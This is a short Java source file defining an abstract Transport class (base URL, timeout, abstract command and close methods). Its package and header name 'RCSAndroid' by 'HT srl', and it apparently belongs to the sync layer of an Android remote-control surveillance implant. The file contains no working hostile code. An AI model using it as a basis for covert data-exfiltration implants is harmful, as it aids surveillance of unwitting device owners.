/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : Transport.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.action.sync;

import com.ht.RCSAndroidGUI.Debug;

// TODO: Auto-generated Javadoc
/**
 * The Class Transport.
 */
public abstract class Transport {
	/** The debug. */
	private static String TAG = "Transport";
	/** The timeout. */
	protected final int timeout = 3 * 60 * 1000;

	/** The baseurl. */
	protected String baseurl;

	/** The suffix. */
	protected String suffix;

	/**
	 * Instantiates a new transport.
	 * 
	 * @param baseurl
	 *            the baseurl
	 */
	public Transport(final String baseurl) {
		// this.host = host;
		// this.port = port;
		this.baseurl = baseurl;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Object#toString()
	 */
	@Override
	public String toString() {
		return "Transport " + getUrl();
	}

	/**
	 * Checks if is available.
	 * 
	 * @return true, if is available
	 */
	public abstract boolean isAvailable();

	/**
	 * Command.
	 * 
	 * @param data
	 *            the data
	 * @return the byte[]
	 * @throws TransportException
	 *             the transport exception
	 */
	public abstract byte[] command(byte[] data) throws TransportException;

	// public abstract void initConnectionUrl();
	/**
	 * Gets the suffix.
	 * 
	 * @return the suffix
	 */
	protected abstract String getSuffix();

	/**
	 * Close.
	 */
	public abstract void close();

	/**
	 * Gets the url.
	 * 
	 * @return the url
	 */
	public String getUrl() {
		return baseurl;
	}

}
